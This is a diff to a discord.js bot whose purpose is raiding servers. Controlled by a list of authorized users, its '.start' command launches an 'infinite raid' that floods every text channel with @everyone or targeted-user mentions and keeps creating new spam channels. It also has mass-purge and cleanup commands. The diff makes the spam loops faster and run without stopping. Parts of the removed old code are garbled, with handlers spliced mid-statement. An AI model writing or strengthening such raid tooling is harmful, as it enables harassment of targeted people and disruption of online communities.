@@ -1,9 +1,7 @@
-import { Client, Events, GatewayIntentBits } from 'discord.js';
+import { Client, Events, GatewayIntentBits, PermissionFlagsBits } from 'discord.js';
 
 const AUTHORIZED_USER_IDS = new Set(["1298640383688970293"]);
 let isSpamming = false;
-let spamInterval = null;
-let channelInterval = null;
 const createdChannelIds = new Set();
 let spamPhrase = "Ghaith is king";
 let targetedUserId = null;
@@ -24,171 +22,161 @@ client.on(Events.MessageCreate, async (message) => {
   if (message.author.bot) return;
   if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;
 
-  if (message.content.startsWith('.recruit')) {
-    const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
+  const content = message.content.trim();
+  const args = content.split(/\s+/);
+  const command = args[0].toLowerCase();
+
+  // .recruit [user_id]
+  if (command === '.recruit') {
+    const targetId = args[1]?.replace(/[<@!>]/g, '');
     if (targetId) {
       AUTHORIZED_USER_IDS.add(targetId);
-      try {
-        await message.reply(`User <@${targetId}> has been recruited.`);
-      } catch (e) {}
+      message.reply(`User <@${targetId}> has been recruited.`).catch(() => {});
     }
     return;
   }
 
-  if (message.content.startsWith('.revoke')) {
-    const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
+  // .revoke [user_id]
+  if (command === '.revoke') {
+    const targetId = args[1]?.replace(/[<@!>]/g, '');
     if (targetId) {
       AUTHORIZED_USER_IDS.delete(targetId);
-      try {
-        await message.reply(`User <@${targetId}> has been revoked.`);
-      } catch (e) {}
+      message.reply(`User <@${targetId}> has been revoked.`).catch(() => {});
     }
     return;
   }
 
-  if (message.content.startsWith('.change')) {
-    const newPhrase = message.content.split(' ').slice(1).join(' ');
+  // .change [phrase]
+  if (command === '.change') {
+    const newPhrase = args.slice(1).join(' ');
     if (newPhrase) {
       spamPhrase = newPhrase;
-      try {
-        await message.reply(`Spam phrase changed to: ${newPhrase}`);
-      } catch (e) {}
+      message.reply(`Spam phrase changed to: ${newPhrase}`).catch(() => {});
     }
     return;
   }
 
-  if (message.content.startsWith('.choose')) {
-    const target = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
+  // .choose [user_id]
+  if (command === '.choose') {
+    const target = args[1]?.replace(/[<@!>]/g, '');
     if (target) {
       targetedUserId = target;
-      try {
-        await message.reply(`Targeted user set to <@${target}>.`);
-      } catch (e) {}
+      message.reply(`Targeted user set to <@${target}>.`).catch(() => {});
     } else {
       targetedUserId = null;
-      try {
-        await .startsWith('.purge')) {
-    const amount = parseInt(message.content.split(' ')[1]);
-    if (isNaN(amount) || amount <= 0) {
-      return message.reply('Please specify a valid number of messages to purge (e.g., .purge 50).').catch(() => {});
+      message.reply("Targeted user cleared. Pinging @everyone.").catch(() => {});
     }
+    return;
+  }
 
-    const deleteAmount = Math.min(amount, 100); // Discord bulkDelete limit is 100
+  // .purge [amount]
+  if (command === '.purge') {
+    let amount = parseInt(args[1]);
+    if (isNaN(amount)) amount = 100;
+    if (amount <= 0) return message.reply('Specify a valid amount.').catch(() => {});
+
     try {
-      const deleted = await message.channel.bulkDelete(deleteAmount, true);
-      message.channel.send(`Successfully purged ${deleted.size} messages.`).then(msg => {
+      // Small delay to ensure command message itself is included if possible
+      await message.delete().catch(() => {});
+      
+      const deleteBatch = async (remaining) => {
+        if (remaining <= 0) return;
+        const toDelete = Math.min(remaining, 100);
+        const deleted = await message.channel.bulkDelete(toDelete, true);
+        if (deleted.size < toDelete) return; // Stop if we can't delete more
+        if (remaining - deleted.size > 0) {
+          await new Promise(r => setTimeout(r, 1000));
+          await deleteBatch(remaining - deleted.size);
+        }
+      };
+
+      await deleteBatch(amount);
+      message.channel.send('Purge complete.').then(msg => {
         setTimeout(() => msg.delete().catch(() => {}), 3000);
       }).catch(() => {});
     } catch (err) {
-      message.reply('Failed to purge messages. They might be older than 14 days.').catch(() => {});
+      message.reply('Purge failed. Check permissions (Manage Messages) and message age (<14 days).').catch(() => {});
     }
     return;
   }
 
-  if (message.contentmessage.reply("Targeted user cleared. Pinging @everyone.");
-      } catch (e) {}
-    }
-    return;
-  }
-
-  if (message.content === '.start') {
+  // .start
+  if (command === '.start') {
     if (isSpamming) return;
     isSpamming = true;
-    
     const guild = message.guild;
     if (!guild) return;
 
-    const createChannels = async () => {
-      if (!isSpamming) return;
-      for (let i = 0; i < 10; i++) {
-        if (!isSpamming) break;
+    message.reply('Starting infinite raid...').catch(() => {});
+
+    // Message Spam Loop
+    const runSpam = async () => {
+      while (isSpamming) {
         try {
-          const channel = await guild.channels.create({
-            name: spamPhrase,
-            type: 0,
-          });
-          createdChannelIds.add(channel.id);
+          const channels = guild.channels.cache.filter(c => c.isTextBased());
           const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
-          channel.send(`${mention} ${spamPhrase}`).catch(() => {});
-        } catch (e) {
-          break;
-        }
+          await Promise.all(channels.map(async (channel) => {
+            if (!isSpamming) return;
+            for(let i=0; i<5; i++) {
+              if (!isSpamming) break;
+              channel.send(`${mention} ${spamPhrase}`).catch(() => {});
+            }
+          }));
+          await new Promise(r => setTimeout(r, 200));
+        } catch (e) { if (!isSpamming) break; }
       }
     };
 
-    const spamMessages = async () => {
-      if (!isSpamming) return;
-      const channels = guild.channels.cache.filter(c => c.isTextBased());
-      channels.forEach(async (channel) => {
-        if (!isSpamming) return;
+    // Channel Creation Loop
+    const runChannelCreation = async () => {
+      while (isSpamming) {
         try {
-          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
-          for(let i=0; i<3; i++) {
+          const creations = [];
+          for (let i = 0; i < 5; i++) {
             if (!isSpamming) break;
-            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
+            creations.push(guild.channels.create({ name: spamPhrase, type: 0 }).then(channel => {
+              createdChannelIds.add(channel.id);
+              const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
+              channel.send(`${mention} ${spamPhrase}`).catch(() => {});
+            }).catch(() => {}));
           }
-        } catch (e) {}
-      });
+          await Promise.all(creations);
+          await new Promise(r => setTimeout(r, 1000));
+        } catch (e) { if (!isSpamming) break; }
+      }
     };
 
-    createChannels();
-    spamMessages();
-    channelInterval = setInterval(createChannels, 1000);
-    spamInterval = setInterval(spamMessages, 500);
+    runSpam();
+    runChannelCreation();
+    return;
   }
 
-  if (message.content === '.stop') {
+  // .stop
+  if (command === '.stop') {
     isSpamming = false;
-    if (spamInterval) {
-      clearInterval(spamInterval);
-      spamInterval = null;
-    }
-    if (channelInterval) {
-      clearInterval(channelInterval);
-      channelInterval = null;
-    }
-
-    try {
-      await message.reply('Stopping and cleaning up...');
-    } catch (e) {}
-    
+    message.reply('Stopping and cleaning up...').catch(() => {});
     const guild = message.guild;
     if (guild) {
       (async () => {
-        const channelDeletions = Array.from(createdChannelIds).map(async (channelId) => {
+        const toDelete = Array.from(createdChannelIds);
+        createdChannelIds.clear();
+        for (const id of toDelete) {
           try {
-            const channel = await guild.channels.fetch(channelId);
+            const channel = await guild.channels.fetch(id);
             if (channel) await channel.delete();
           } catch (e) {}
-        });
-        createdChannelIds.clear();
-
-        const nameDeletions = guild.channels.cache
-          .filter(c => c.name === 'ghaith-is-king' || c.name === 'Ghaith is king' || c.name === spamPhrase.toLowerCase().replace(/\s+/g, '-'))
-          .map(async (channel) => {
-            try {
-              await channel.delete();
-            } catch (e) {}
-          });
-
-        await Promise.all([...channelDeletions, ...nameDeletions]);
-
-        const textChannels = guild.channels.cache.filter(c => c.isTextBased());
-        textChannels.forEach(async (channel) => {
-          try {
-            const messages = await channel.messages.fetch({ limit: 100 });
-            const spamMessages = messages.filter(m => (m.content.includes(spamPhrase) || m.content.includes('Ghaith is king')) && m.author.id === client.user.id);
-            if (spamMessages.size > 0) {
-              await channel.bulkDelete(spamMessages).catch(() => {
-                spamMessages.forEach(m => m.delete().catch(() => {}));
-              });
-            }
-          } catch (e) {}
-        });
-      })();
+        }
+        const pattern = spamPhrase.toLowerCase().replace(/\s+/g, '-');
+        const suspicious = guild.channels.cache.filter(c => c.name.includes('ghaith') || c.name === pattern);
+        for (const [_, c] of suspicious) {
+          try { await c.delete(); } catch (e) {}
+        }
+      })().catch(console.error);
     }
     return;
   }
 });
 
-client.login(process.env.DISCORD_TOKEN).catch(console.error);
+client.login(process.env.DISCORD_TOKEN).catch(err => {
+  console.error('Login failed:', err.message);
+});
